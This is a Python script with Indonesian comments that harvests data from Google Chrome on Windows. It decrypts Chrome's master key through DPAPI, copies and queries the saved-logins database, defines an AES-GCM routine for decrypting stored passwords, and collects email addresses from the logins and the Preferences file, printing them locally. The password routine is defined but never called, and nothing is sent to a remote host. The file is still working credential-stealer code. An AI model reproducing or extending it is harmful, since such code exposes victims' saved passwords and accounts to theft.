import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import base64
import shutil
import re

def get_chrome_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Hilangkan prefix 'DPAPI'
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        encrypted_password = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()  # Hilangkan GCM tag
        return decrypted_password
    except Exception as e:
        print("Gagal mendekripsi password:", e)
        return ""

def get_chrome_passwords_and_emails():
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
    )
    db_copy = os.path.join(os.environ['USERPROFILE'], 'Login Data Copy')
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    master_key = get_chrome_master_key()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    emails = []
    for row in cursor.fetchall():
        username = row[1]
        if "@" in username:  # Asumsi username yang mengandung '@' adalah email
            emails.append(username)

    cursor.close()
    conn.close()
    os.remove(db_copy)

    return emails

def get_emails_from_preferences(preferences_data):
    emails = []

    # Regex untuk mencari pola email
    email_pattern = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

    # Pencarian email dalam file Preferences
    def search_for_emails(data):
        if isinstance(data, dict):
            for value in data.values():
                search_for_emails(value)
        elif isinstance(data, list):
            for item in data:
                search_for_emails(item)
        elif isinstance(data, str):
            # Cari semua email yang sesuai pola
            found_emails = email_pattern.findall(data)
            emails.extend(found_emails)

    search_for_emails(preferences_data)

    return list(set(emails))

def display_emails(preferences_data):
    # Mengumpulkan email dari Login Data dan Preferences
    emails_from_logins = get_chrome_passwords_and_emails()
    emails_from_preferences = get_emails_from_preferences(preferences_data)

    all_emails = set(emails_from_logins + emails_from_preferences)

    if all_emails:
        print("\nEmails Found:")
        print("="*15)
        for email in all_emails:
            print(f"Email: {email}")
    else:
        print("Tidak ada email ditemukan.")

if __name__ == '__main__':
    preferences_file_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Preferences'
    )
    with open(preferences_file_path, 'r', encoding='utf-8') as file:
        preferences_data = json.load(file)

    display_emails(preferences_data)